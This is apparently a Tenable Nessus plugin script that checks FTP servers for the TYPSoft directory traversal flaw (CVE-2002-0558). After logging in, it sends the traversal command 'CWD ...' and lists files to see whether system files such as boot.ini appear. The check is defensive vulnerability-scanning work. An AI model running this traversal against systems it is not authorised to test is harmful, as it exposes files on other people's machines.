#
# (C) Tenable Network Security, Inc.
#

# References:
#
# From: support@securiteam.com
# To: list@securiteam.com
# Date: 18 Dec 2002 00:40:44 +0200
# Subject: [NT] TYPSoft FTP Server Directory Traversal Vulnerability


include("compat.inc");

if(description)
{
 script_id(14706);
 script_bugtraq_id(2489);
 script_cve_id("CVE-2002-0558");
 script_xref(name:"OSVDB", value:"6798");
 script_version("$Revision: 1.12 $");

 script_name(english:"TYPSoft FTP Server LIST Command Traversal Arbitrary Directory Listing");

 script_set_attribute(attribute:"synopsis", value:
"The FTP server suffers from a directory traversal flaw." );
 script_set_attribute(attribute:"description", value:
"Using 'cd ...', it is possible to get out of the FTP server root 
directory and access any file on the remote machine." );
 script_set_attribute(attribute:"solution", value:
"Contact your vendor for a fix.
If you are using TYPSoft FTP Server, update to 0.99.13 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:S/C:P/I:N/A:N" );
 
script_end_attributes();

 script_summary(english:"FTP directory traversal using 'cd ...'");
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");
 script_family(english: "FTP");
 script_dependencie("find_service_3digits.nasl", "ftp_anonymous.nasl");
 script_require_ports("Services/ftp", 21);
 script_require_keys("ftp/login");
 exit(0);
}


#
# The script code starts here
#

include("ftp_func.inc");
include('global_settings.inc');

port = get_kb_item("Services/ftp");
if (!port) port = 21;
if(! get_port_state(port)) exit(0);

if (!thorough_tests)
{
 banner = get_ftp_banner(port:port);
 if ( "TYPSoft FTP Server" >!< banner)
   exit(0);
}

login = get_kb_item("ftp/login");
pass  = get_kb_item("ftp/password");
if (! login) login = "anonymous";
if (! pass) pass = "test@test.com";

soc = open_sock_tcp(port);
if (!soc) exit(0);

if(ftp_authenticate(socket:soc, user:login, pass:pass))
{
 for (i = 0; i < 1; i ++)
 {
  r = ftp_send_cmd(socket: soc, cmd: 'CWD ...');
  debug_print(level: 2, 'CWD ... => ', substr(r, 0, 3));
  # EFTP is vulnerable to a similar bug but it says "permission denied"
  if (! thorough_tests && r !~ '^2[0-9][0-9] ') break;
 }
 port2 = ftp_pasv(socket: soc);
 if (! port2) exit(0);

 soc2 = open_sock_tcp(port2, transport: ENCAPS_IP);
 if (soc2)
 {
  r = ftp_send_cmd(socket: soc, cmd: 'LIST');
  l = recv(socket: soc2, length: 2048);
  if (egrep(string: l, pattern: 'autoexec.bat|boot.ini', icase: 1))
   security_warning(port);
 }
 if (soc2) close(soc2);
 ftp_close(socket: soc);
 exit(0);
}
